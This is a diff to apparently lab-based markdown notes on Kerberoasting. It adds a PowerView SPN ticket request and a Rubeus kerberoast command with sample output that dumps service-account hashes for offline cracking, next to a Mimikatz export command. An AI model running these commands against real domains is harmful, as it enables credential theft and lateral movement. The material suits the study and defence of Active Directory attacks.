@@ -34,7 +34,7 @@ After enum it, we need to request a TGS:
 
 * PowerView:
 ```powershell
-Request-SPNTicket
+Get-NetUser -SPN | Request-SPNTicket
 ```
 
 * ADModule:
@@ -51,6 +51,48 @@ Finally all tickets should be exported.
 Inovoke-Mimikatz -Command '"kerberos::list /export"'
 ```
 
+* Rubeus
+
+```
+PS C:\Windows\Temp\Rubeus\>.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Searching the current domain for Kerberoastable users
+
+[*] Total kerberoastable users : 2
+
+
+[*] SamAccountName         : websvc
+[*] DistinguishedName      : CN=websvc,CN=Users,DC=corp,DC=local
+[*] ServicePrincipalName   : SNMP/adminsrv.corp.LOCAL
+[*] PwdLastSet             : 2/17/2019 1:01:06 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash written to C:\Windows\Temp\Rubeus\hashes.kerberoast
+
+
+[*] SamAccountName         : svcadmin
+[*] DistinguishedName      : CN=svcadmin,CN=UsersDC=corp,DC=local
+[*] ServicePrincipalName   : MSSQLSvc/mgmt.corp.local:1433
+[*] PwdLastSet             : 2/17/2019 2:22:50 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash written to C:\Windows\Temp\Rubeus\hashes.kerberoast
+
+[*] Roasted hashes written to : C:\Windows\Temp\Rubeus\hashes.kerberoast
+```
 ### Cracking the tickets
 
 Once the tickets are exported it can be cracked with `john`, `hashcat` or `tgsrepcrack.py` tool:
